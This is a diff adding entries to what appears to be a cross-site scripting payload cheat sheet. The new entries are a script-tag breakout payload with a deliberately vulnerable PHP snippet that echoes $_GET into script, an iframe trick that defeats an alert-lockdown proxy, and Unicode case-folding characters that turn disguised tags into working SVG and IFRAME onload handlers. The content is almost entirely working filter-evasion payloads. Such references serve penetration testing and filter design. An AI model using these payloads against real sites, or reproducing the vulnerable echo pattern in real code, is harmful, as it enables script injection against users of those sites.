@@ -368,6 +368,16 @@ Bypass quotes for string
 String.fromCharCode(88,83,83)
 ```
 
+Bypass quotes in script tag
+```
+http://localhost/bla.php?test=</script><script>alert(1)</script>
+<html>
+  <script>
+    <?php echo 'foo="text '.$_GET['test'].'";';`?>
+  </script>
+</html>
+```
+
 Bypass dot filter 
 ```
 <script>window['alert'](document['domain'])<script>
@@ -421,6 +431,28 @@ Bypass using an alternate way to execute an alert
 <script>top['alert'](3)</script>
 ```
 
+Bypass using an alternate way to trigger an alert
+```
+var i = document.createElement("iframe");
+i.onload = function(){
+  i.contentWindow.alert(1);
+}
+document.appendChild(i);
+
+// Bypassed security
+XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
+      var proxy = obj[name];
+      obj[name] = function () {
+         if (exec_original) {
+            return proxy.apply(this, arguments);
+         }
+      };
+      XSSObject.lockdown(obj, name);
+   };
+XSSObject.proxy(window, 'alert', 'window.alert', false);
+```
+
+
 Bypass ';' using another character
 ```
 'te' * alert('*') * 'xt';
@@ -463,6 +495,17 @@ transformed into U+0027 APOSTROPHE (')
 E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
 %EF%BC%9E becomes >
 %EF%BC%9C becomes <
+```
+
+Bypass using unicode converted to uppercase
+```
+İ (%c4%b0).toLowerCase() => i
+ı (%c4%b1).toUpperCase() => I
+ſ (%c5%bf) .toUpperCase() => S
+K (%E2%84%AA).toLowerCase() => k
+
+<ſvg onload=... > become <SVG ONLOAD=...> 
+<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
 ```
 
 Bypass using overlong UTF-8
